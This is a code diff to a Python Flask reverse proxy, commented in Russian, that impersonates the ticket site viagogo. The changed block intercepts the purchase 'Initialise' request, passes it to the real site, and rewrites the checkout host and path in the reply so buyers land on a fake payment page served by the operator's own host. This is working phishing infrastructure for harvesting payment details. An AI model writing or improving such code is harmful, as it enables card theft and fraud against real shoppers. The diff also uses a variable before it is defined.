@@ -195,9 +195,21 @@ def proxy(path=''):
     print(f"[REQUEST] {request.method} {request.url} -> {path}")
 
     # Если это запрос к фейковой платёжной странице
-    if CHECKOUT_TRIGGER in request.path or path.endswith('/checkout/payment'):
-        print(f"[TRIGGER] Checkout detected, serving fake payment page")
-        return render_template('fake_payment.html', host=EXTERNAL_HOST)
+    if '/secure/buy/Initialise' in request.path:
+        print(f"[TRIGGER] Initialise detected, intercepting")
+        resp = session.request(
+            method=request.method,
+            url=target_url,
+            headers=headers,
+            data=request.get_data(),
+            allow_redirects=False,
+            timeout=25,
+            verify=True
+        )
+        content_str = resp.content.decode('utf-8', errors='ignore')
+        content_str = content_str.replace('checkout.viagogo.com', EXTERNAL_HOST)
+        content_str = content_str.replace('/secure/buy/checkout', '/payment-page')
+        return Response(content_str, status=resp.status_code, content_type='application/json')
 
     target_url = f"{TARGET_SCHEME}://{TARGET_DOMAIN}/{path}"
     if request.query_string:
